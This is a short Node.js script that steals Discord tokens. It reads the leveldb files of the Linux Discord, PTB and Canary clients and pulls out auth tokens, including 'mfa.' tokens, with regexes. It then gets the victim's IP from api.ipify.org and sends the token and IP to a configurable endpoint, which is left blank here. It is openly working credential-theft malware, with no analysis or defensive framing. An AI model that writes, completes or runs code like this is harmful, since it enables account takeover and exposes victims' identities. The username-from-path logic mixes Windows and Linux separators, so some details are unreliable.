const fs = require('fs')
const fetch = require('node-fetch')
const apiurl = ""


const paths = [
    `/home/${(__dirname.split("\\")[2])}/.config/discord/Local Storage/leveldb`,
    `/home/${(__dirname.split("\\")[2])}/.config/discordptb/Local Storage/leveldb`,
    `/home/${(__dirname.split("\\")[2])}/.config/discordcanary/Local Storage/leveldb`
]

for (i = 0; i < paths.length; i++) {
    grabtoken(paths[i])
}

function grabtoken(path) {
    try {
        fs.readdir(path, (erreur, file) => {
            if (file) {
                var f = file.filter(f => f.split('.').pop() == "ldb")
                for (i = 0; i < f.length; i++) {
                    fs.readFile(`${path}/${f[i]}`, 'utf-8', function (erreur, tokenfile) {
                        var nomfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                        var mfa = /"mfa\.[\d\w_-]{84}"/
                        var token = nomfa.exec(tokenfile) || mfa.exec(tokenfile);
                        if (token) {
                            fetch("https://api.ipify.org?format=json").then(r => r.json()).then(json => {
                                fetch(apiurl, {
                                    headers: {
                                        token: token,
                                        ip: json.ip
                                    }
                                })
                            })
                        }
                    })
                }
            }
        })
    } catch (e) {}
}